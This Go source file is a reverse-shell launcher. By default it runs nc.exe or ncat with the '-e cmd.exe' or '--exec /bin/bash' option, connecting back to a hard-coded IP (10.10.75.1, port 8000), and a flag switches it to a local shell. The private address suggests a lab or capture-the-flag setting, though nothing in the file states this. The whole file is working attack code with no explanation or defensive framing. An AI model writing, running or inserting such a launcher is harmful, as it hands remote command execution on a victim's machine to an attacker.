package main

import (
	"os"
	"os/exec"
	"runtime"
	"flag"
)

func execute(osType, ip string, remote bool) {
	var cmd *exec.Cmd
	if remote == true {
	if osType == "win" {
		args := []string{ip, "8000", "-e", "cmd.exe"}
		cmd = exec.Command("c:\\Tools\\nc.exe", args...)
	} else {
		args := []string{ip, "8000", "--exec", "/bin/bash"}
		cmd = exec.Command("/usr/bin/ncat", args...)
	}
} else {
	if osType == "win" {
		cmd = exec.Command("powershell.exe")
	} else {
		cmd = exec.Command("/bin/sh")
	}
}
	cmd.Stdout = os.Stdout
	cmd.Stdin = os.Stdin
	cmd.Stderr = os.Stderr
	cmd.Run()
}

func main() {
	var ip = flag.String("ip", "10.10.75.1", "IP to connect back to")
	var remote = flag.Bool("remote", true, "Toggle if you want a local shell, not a network one.")
	flag.Parse()
	if runtime.GOOS == "windows" {
		execute("win", *ip, *remote)
	} else {
		execute("linux", *ip, *remote)
	}
}
